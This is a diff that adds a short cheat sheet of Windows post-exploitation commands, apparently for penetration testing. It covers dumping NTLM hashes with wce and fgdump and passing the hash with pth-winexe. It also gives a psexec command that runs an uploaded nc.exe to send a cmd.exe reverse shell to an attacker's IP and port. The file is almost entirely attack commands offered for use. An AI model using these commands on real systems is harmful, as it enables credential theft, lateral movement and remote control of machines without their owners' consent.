@@ -1,0 +1,16 @@
+# Windows hash format:
+user:group:id:ntlmpassword::
+
+# Dump the hashes in the affected system running:
+wce32.exe -w
+wce64.exe -w
+fgdump.exe
+
+# Apply Pass-the-hash
+pth-winexe -U DOMAIN/user%hash //$ip cmd
+# or the following
+export SMBHASH=xxx; pth-winexe -U user%  //$ip cmd
+
+# psexec using found credentials
+# first upload nc.exe to a writable directory
+psexec.exe -u <username> -p <password> \\MACHINENAME C:\Inetpub\nc.exe <attackerip> <attackerport> -e C:\windows\system32\cmd.exe
